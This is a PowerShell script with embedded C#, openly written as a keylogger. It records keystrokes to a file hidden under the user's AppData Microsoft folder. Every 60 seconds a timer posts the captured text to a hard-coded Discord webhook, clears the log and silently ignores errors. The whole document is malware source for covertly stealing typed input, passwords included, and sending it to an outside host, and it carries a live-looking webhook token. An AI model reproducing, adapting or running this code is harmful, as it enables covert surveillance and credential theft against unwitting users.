# Config
$logFile = "$env:APPDATA\Microsoft\keylog.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400154362399031406/DGLbSSN0EwdtdwbfECMX3S7WveKMCmsxGyXGfDFEzQFjiOl9dzlNoebvkt_yMi4pxSQs"


# Setup
Add-Type -AssemblyName System.Windows.Forms
$null = New-Item -Path $logFile -ItemType File -Force

# Function: Send logs to Discord
function Send-ToDiscord {
    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content.Length -gt 0) {
            $payload = @{
                content = "**Keylog Update**`n```\n$content\n```"
            } | ConvertTo-Json -Compress
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                Clear-Content $logFile
            } catch {
                # ignore errors
            }
        }
    }
}

# Timer: Every 60 seconds
$timer = New-Object Timers.Timer
$timer.Interval = 60000
$timer.AutoReset = $true
$timer.Enabled = $true
Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action { Send-ToDiscord }

# Custom message filter class
Add-Type @"
using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

public class KeyLogger : IMessageFilter {
    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
    [DllImport("user32.dll")]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    public bool PreFilterMessage(ref Message m) {
        const int WM_KEYDOWN = 0x0100;
        if (m.Msg == WM_KEYDOWN) {
            int vkCode = m.WParam.ToInt32();
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);
            System.Text.StringBuilder buffer = new System.Text.StringBuilder(2);
            ToUnicode((uint)vkCode, 0, keyboardState, buffer, buffer.Capacity, 0);
            string key = buffer.ToString();
            System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\keylog.txt", key);
        }
        return false;
    }
}
"@

# Register message filter
$keyLogger = New-Object KeyLogger
[System.Windows.Forms.Application]::AddMessageFilter($keyLogger)

# Start the message loop
[System.Windows.Forms.Application]::Run()

